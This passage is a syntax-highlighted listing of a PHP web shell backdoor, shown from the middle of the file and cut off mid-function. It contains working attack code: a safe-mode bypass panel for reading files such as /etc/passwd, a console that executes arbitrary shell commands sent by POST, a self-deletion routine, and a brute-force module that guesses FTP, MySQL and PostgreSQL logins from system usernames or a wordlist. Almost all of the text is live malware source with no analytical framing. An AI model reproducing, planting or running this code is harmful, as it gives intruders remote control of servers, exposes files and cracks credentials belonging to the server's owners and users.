<span class="lineno"> 895</span>     <span class="p">}</span> 
<span class="lineno"> 896</span>     <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 897</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 898</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 899</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;1&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;2&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;3&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;4&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid (&quot;Read&quot; /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\&#39;&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&lt;span&gt;Imap_open (read file)&lt;/span&gt;&lt;form onsubmit=\&#39;g(null,null,&quot;6&quot;,this.param.value);return false;\&#39;&gt;&lt;input type=text name=param&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 900</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> 
<span class="lineno"> 901</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=&quot;ml1&quot; style=&quot;margin-top:5px&quot; id=&quot;Output&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 902</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 903</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 904</span> <span class="p">}</span> 
<span class="lineno"> 905</span> 
<span class="lineno"> 906</span> <span class="k">function</span> <span class="nf">actionConsole</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 907</span>     <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 908</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno"> 909</span>         <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 910</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.cmd.value=&#39;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 911</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">iconv</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">],</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">));</span> 
<span class="lineno"> 912</span>         <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;!.*cd\s+([^;]+)$!&quot;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$match</span><span class="p">))</span>    <span class="p">{</span> 
<span class="lineno"> 913</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 914</span>                 <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span> 
<span class="lineno"> 915</span>                 <span class="k">echo</span> <span class="s2">&quot;document.mf.c.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span> 
<span class="lineno"> 916</span>             <span class="p">}</span> 
<span class="lineno"> 917</span>         <span class="p">}</span> 
<span class="lineno"> 918</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.output.value+=&#39;&quot;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span> 
<span class="lineno"> 919</span>         <span class="k">echo</span> <span class="s2">&quot;document.cf.output.scrollTop = document.cf.output.scrollHeight;&quot;</span><span class="p">;</span> 
<span class="lineno"> 920</span>         <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span> 
<span class="lineno"> 921</span>         <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span> 
<span class="lineno"> 922</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno"> 923</span>     <span class="p">}</span> 
<span class="lineno"> 924</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 925</span> <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno"> 926</span> <span class="x">&lt;script&gt; </span>
<span class="lineno"> 927</span> <span class="x">if(window.Event) window.captureEvents(Event.KEYDOWN); </span>
<span class="lineno"> 928</span> <span class="x">var cmds = new Array(&quot;&quot;); </span>
<span class="lineno"> 929</span> <span class="x">var cur = 0; </span>
<span class="lineno"> 930</span> <span class="x">function kp(e) { </span>
<span class="lineno"> 931</span> <span class="x">    var n = (window.Event) ? e.which : e.keyCode; </span>
<span class="lineno"> 932</span> <span class="x">    if(n == 38) { </span>
<span class="lineno"> 933</span> <span class="x">        cur--; </span>
<span class="lineno"> 934</span> <span class="x">        if(cur&gt;=0) </span>
<span class="lineno"> 935</span> <span class="x">            document.cf.cmd.value = cmds[cur]; </span>
<span class="lineno"> 936</span> <span class="x">        else </span>
<span class="lineno"> 937</span> <span class="x">            cur++; </span>
<span class="lineno"> 938</span> <span class="x">    } else if(n == 40) { </span>
<span class="lineno"> 939</span> <span class="x">        cur++; </span>
<span class="lineno"> 940</span> <span class="x">        if(cur &lt; cmds.length) </span>
<span class="lineno"> 941</span> <span class="x">            document.cf.cmd.value = cmds[cur]; </span>
<span class="lineno"> 942</span> <span class="x">        else </span>
<span class="lineno"> 943</span> <span class="x">            cur--; </span>
<span class="lineno"> 944</span> <span class="x">    } </span>
<span class="lineno"> 945</span> <span class="x">} </span>
<span class="lineno"> 946</span> <span class="x">function add(cmd) { </span>
<span class="lineno"> 947</span> <span class="x">    cmds.pop(); </span>
<span class="lineno"> 948</span> <span class="x">    cmds.push(cmd); </span>
<span class="lineno"> 949</span> <span class="x">    cmds.push(&quot;&quot;); </span>
<span class="lineno"> 950</span> <span class="x">    cur = cmds.length-1; </span>
<span class="lineno"> 951</span> <span class="x">} </span>
<span class="lineno"> 952</span> <span class="x">&lt;/script&gt; </span>
<span class="lineno"> 953</span> <span class="cp">&lt;?php</span> 
<span class="lineno"> 954</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit=&quot;if(document.cf.cmd.value==\&#39;clear\&#39;){document.cf.output.value=\&#39;\&#39;;document.cf.cmd.value=\&#39;\&#39;;return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;&quot;&gt;&lt;select name=alias&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 955</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;aliases&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 956</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 957</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;optgroup label=&quot;-&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$n</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;-&quot;&gt;&lt;/optgroup&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 958</span>             <span class="k">continue</span><span class="p">;</span> 
<span class="lineno"> 959</span>         <span class="p">}</span> 
<span class="lineno"> 960</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;&lt;/option&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 961</span>     <span class="p">}</span> 
<span class="lineno"> 962</span>     <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> 
<span class="lineno"> 963</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 964</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/select&gt;&lt;input type=button onclick=&quot;add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}&quot; value=&quot;&gt;&gt;&quot;&gt; &lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&gt; send using AJAX&lt;br/&gt;&lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 965</span>     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 966</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">ex</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span> 
<span class="lineno"> 967</span>     <span class="p">}</span> 
<span class="lineno"> 968</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=text name=cmd style=&quot;border-top:0;width:100%;margin:0;&quot; onkeydown=&quot;kp(event);&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 969</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/form&gt;&lt;/div&gt;&lt;script&gt;document.cf.cmd.focus();&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 970</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 971</span> <span class="p">}</span> 
<span class="lineno"> 972</span> 
<span class="lineno"> 973</span> <span class="k">function</span> <span class="nf">actionLogout</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 974</span>     <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])]);</span> 
<span class="lineno"> 975</span>     <span class="k">echo</span> <span class="s1">&#39;bye!&#39;</span><span class="p">;</span> 
<span class="lineno"> 976</span> <span class="p">}</span> 
<span class="lineno"> 977</span> 
<span class="lineno"> 978</span> <span class="k">function</span> <span class="nf">actionSelfRemove</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 979</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 980</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 981</span>         <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nx">SELF_PATH</span><span class="p">))</span> 
<span class="lineno"> 982</span>             <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span> 
<span class="lineno"> 983</span>         <span class="k">else</span> 
<span class="lineno"> 984</span>             <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span> 
<span class="lineno"> 985</span>     <span class="p">}</span> 
<span class="lineno"> 986</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&gt;Yes&lt;/a&gt;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 987</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 988</span> <span class="p">}</span> 
<span class="lineno"> 989</span> 
<span class="lineno"> 990</span> <span class="k">function</span> <span class="nf">actionBruteforce</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 991</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno"> 992</span>     <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 993</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &lt;span&gt;Server:&lt;/span&gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 994</span>         <span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ftp&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 995</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 996</span>                 <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">21</span><span class="p">);</span> 
<span class="lineno"> 997</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno"> 998</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno"> 999</span>                 <span class="o">@</span><span class="nb">ftp_close</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno">1000</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1001</span>             <span class="p">}</span> 
<span class="lineno">1002</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1003</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1004</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">3306</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno">1005</span>                 <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1006</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1007</span>             <span class="p">}</span> 
<span class="lineno">1008</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1009</span>             <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1010</span>                 <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&quot;host=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39; port=&#39;&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s2">&quot;&#39; user=&#39;&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;&#39; password=&#39;&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;&#39; dbname=&#39;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1011</span>                 <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">:</span><span class="mi">5432</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span> 
<span class="lineno">1012</span>                 <span class="o">@</span><span class="nb">pg_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1013</span>                 <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1014</span>             <span class="p">}</span> 
<span class="lineno">1015</span>         <span class="p">}</span> 
<span class="lineno">1016</span>         <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno">1017</span>         <span class="nv">$attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno">1018</span>         <span class="nv">$server</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">]);</span> 
<span class="lineno">1019</span>         <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1020</span>             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span> 
<span class="lineno">1021</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno">1022</span>                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1023</span>                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span> 
<span class="lineno">1024</span>                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1025</span>                     <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1026</span>                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1027</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1028</span>                     <span class="p">}</span> 
<span class="lineno">1029</span>                     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reverse&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno">1030</span>                         <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> 
<span class="lineno">1031</span>                         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nv">$i</span><span class="p">)</span> 
<span class="lineno">1032</span>                             <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span> 
<span class="lineno">1033</span>                         <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1034</span>                         <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1035</span>                             <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1036</span>                             <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span> 
<span class="lineno">1037</span>                         <span class="p">}</span> 
<span class="lineno">1038</span>                     <span class="p">}</span> 
<span class="lineno">1039</span>                 <span class="p">}</span> 
<span class="lineno">1040</span>         <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1041</span>             <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dict&#39;</span><span class="p">]);</span> 
<span class="lineno">1042</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno">1043</span>                 <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1044</span>                     <span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span> 
<span class="lineno">1045</span>                     <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span> 
<span class="lineno">1046</span>                     <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">],</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span> 
